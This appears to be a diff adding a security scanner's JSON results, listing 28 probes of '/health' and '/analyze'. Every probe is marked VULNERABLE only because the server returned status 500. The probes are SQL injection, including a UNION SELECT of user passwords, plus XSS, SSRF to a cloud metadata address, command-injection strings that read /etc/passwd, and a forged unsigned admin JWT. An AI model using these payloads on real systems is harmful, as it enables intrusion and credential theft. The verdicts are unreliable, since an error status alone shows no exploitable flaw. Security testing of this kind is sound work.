@@ -1,0 +1,201 @@
+{
+  "vulnerabilities_found": 28,
+  "results": [
+    {
+      "attack_type": "sqli",
+      "payload": "' OR 1=1 --",
+      "endpoint": "/health",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "sqli",
+      "payload": "admin' --",
+      "endpoint": "/health",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "sqli",
+      "payload": "' UNION SELECT username, password FROM users --",
+      "endpoint": "/health",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "xss",
+      "payload": "<script>alert('xss')</script>",
+      "endpoint": "/health",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "xss",
+      "payload": "<img src=x onerror=alert(1)>",
+      "endpoint": "/health",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "xss",
+      "payload": "javascript:alert(1)",
+      "endpoint": "/health",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "ssrf",
+      "payload": "http://169.254.169.254/latest/meta-data/",
+      "endpoint": "/health",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "ssrf",
+      "payload": "http://localhost:8093/api/v1/trust/scores",
+      "endpoint": "/health",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "ssrf",
+      "payload": "http://127.0.0.1:8500",
+      "endpoint": "/health",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "rce",
+      "payload": "; cat /etc/passwd",
+      "endpoint": "/health",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "rce",
+      "payload": "| id",
+      "endpoint": "/health",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "rce",
+      "payload": "$(whoami)",
+      "endpoint": "/health",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "jwt",
+      "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
+      "endpoint": "/health",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "jwt",
+      "payload": "invalid_signature_token",
+      "endpoint": "/health",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "sqli",
+      "payload": "' OR 1=1 --",
+      "endpoint": "/analyze",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "sqli",
+      "payload": "admin' --",
+      "endpoint": "/analyze",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "sqli",
+      "payload": "' UNION SELECT username, password FROM users --",
+      "endpoint": "/analyze",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "xss",
+      "payload": "<script>alert('xss')</script>",
+      "endpoint": "/analyze",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "xss",
+      "payload": "<img src=x onerror=alert(1)>",
+      "endpoint": "/analyze",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "xss",
+      "payload": "javascript:alert(1)",
+      "endpoint": "/analyze",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "ssrf",
+      "payload": "http://169.254.169.254/latest/meta-data/",
+      "endpoint": "/analyze",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "ssrf",
+      "payload": "http://localhost:8093/api/v1/trust/scores",
+      "endpoint": "/analyze",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "ssrf",
+      "payload": "http://127.0.0.1:8500",
+      "endpoint": "/analyze",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "rce",
+      "payload": "; cat /etc/passwd",
+      "endpoint": "/analyze",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "rce",
+      "payload": "| id",
+      "endpoint": "/analyze",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "rce",
+      "payload": "$(whoami)",
+      "endpoint": "/analyze",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "jwt",
+      "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
+      "endpoint": "/analyze",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    },
+    {
+      "attack_type": "jwt",
+      "payload": "invalid_signature_token",
+      "endpoint": "/analyze",
+      "response_status": 500,
+      "verdict": "VULNERABLE"
+    }
+  ]
+}
